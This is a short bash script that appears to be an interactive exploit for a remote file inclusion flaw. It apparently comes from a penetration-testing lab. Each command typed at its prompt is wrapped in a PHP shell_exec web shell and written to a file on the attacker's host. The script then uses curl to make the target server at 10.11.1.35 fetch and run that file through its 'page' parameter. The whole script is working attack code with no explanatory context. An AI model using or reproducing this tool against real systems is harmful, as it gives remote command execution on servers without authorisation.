#!/bin/bash

function comm {
	echo "<?php echo shell_exec('${cmd}'); ?>" > ~/server/bl1ngrfi.php
	curl -k https://10.11.1.35/section.php?page=http://10.11.0.88/bl1ngrfi
	echo ""
}


m=1
trap '{ echo " Exiting"; m=0; }' SIGINT

while (( m )); do
	echo -n "[^-^]> "
	read cmd
	comm
done